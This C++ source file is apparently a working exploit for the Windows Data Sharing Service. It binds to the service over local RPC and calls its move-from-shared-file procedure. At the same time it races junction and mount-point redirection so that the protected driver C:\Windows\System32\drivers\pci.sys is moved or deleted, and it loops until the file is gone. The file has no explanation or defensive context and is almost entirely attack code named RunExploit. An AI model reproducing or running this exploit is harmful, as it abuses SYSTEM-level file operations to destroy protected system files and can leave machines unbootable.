#include "stdafx.h"
#include "rpc_h.h"
#include "FileOpLock.h"
#include "ReparsePoint.h"
#include <string>
#include <sddl.h>
#include <iostream>

#pragma comment(lib, "rpcrt4.lib")

bool triggered = false;
RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingComposeW(L"bf4dc912-e52f-4904-8ebe-9317c1bdd497", L"ncalrpc", 
		nullptr, nullptr, nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}




DWORD WINAPI MyThreadFunction(LPVOID lpParam);


DWORD WINAPI MyThreadFunction(LPVOID lpParam)
{
	HANDLE hFile;
	FileOpLock* blah = nullptr;
	do
	{
		hFile = CreateFile(L"c:\\blah\\pci.sys",GENERIC_READ,FILE_SHARE_READ |  FILE_SHARE_WRITE | FILE_SHARE_DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);                  
	} while (hFile == INVALID_HANDLE_VALUE);
	ReparsePoint::CreateMountPoint(L"c:\\blah1", L"c:\\windows\\system32\\drivers", L"");
	CloseHandle(hFile);
	return 0;
}


void RunExploit()
{
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);
	if (status != RPC_S_OK)
	{
		printf("Error creating handle %d\n", status);
		return;
	}
	RpcTryExcept
	{

		Proc8_RpcDSSMoveFromSharedFile(handle,L"token",L"c:\\blah1\\pci.sys");
	}
		RpcExcept(1)
	{
		ULONG ulCode = RpcExceptionCode();
		printf("Run time reported exception 0x%lx = %ld\n",
			ulCode, ulCode);

	}
	RpcEndExcept
}

void runme() {
	CreateDirectory(L"c:\\blah1", NULL);
	CreateDirectory(L"c:\\blah", NULL);
	ReparsePoint::CreateMountPoint(L"c:\\blah1", L"c:\\blah", L"");
	HANDLE mThread = CreateThread(
		NULL,                   // default security attributes
		0,                      // use default stack size  
		MyThreadFunction,       // thread function name
		NULL,          // argument to thread function 
		0,                      // use default creation flags 
		NULL);   // returns the thread identifier 
	SetThreadPriority(mThread, THREAD_PRIORITY_TIME_CRITICAL);
	Sleep(1000);
	RunExploit();
	Sleep(1000);
}

int main()
{
	HANDLE hFile;
	system("net start \"Data Sharing Service\"");
	Sleep(1000);
	do
	{
		runme();
		hFile = CreateFile(L"c:\\windows\\system32\\drivers\\pci.sys",                
			GENERIC_READ,          
			FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,                     
			NULL,                   
			OPEN_EXISTING,            
			FILE_ATTRIBUTE_NORMAL, 
			NULL);                 
		CloseHandle(hFile);
	} while (hFile != INVALID_HANDLE_VALUE);

    return 0;
}

